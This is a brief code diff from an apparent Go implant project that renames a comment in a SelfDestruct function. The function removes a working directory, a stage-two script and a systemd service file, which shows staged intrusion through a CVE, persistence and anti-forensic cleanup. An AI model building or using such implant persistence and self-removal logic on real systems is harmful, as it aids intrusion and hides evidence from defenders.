@@ -173,7 +173,7 @@ func (i *Implant) ExecuteTasks() {
 func (i *Implant) SelfDestruct() {
 	os.RemoveAll("/tmp/myapp") // TODO: make sure all implant stuff will be in this dir
 
-	// undoing everything in stage1.sh in CVE
+	// undoing everything in beachhead.sh in CVE
 	stage_2_path := "/tmp/stage2.sh"
 	os.RemoveAll(stage_2_path)                         // remove dir where stage2 is saved
 	os.RemoveAll("/etc/systemd/system/stage2.service") // remove dir with system services
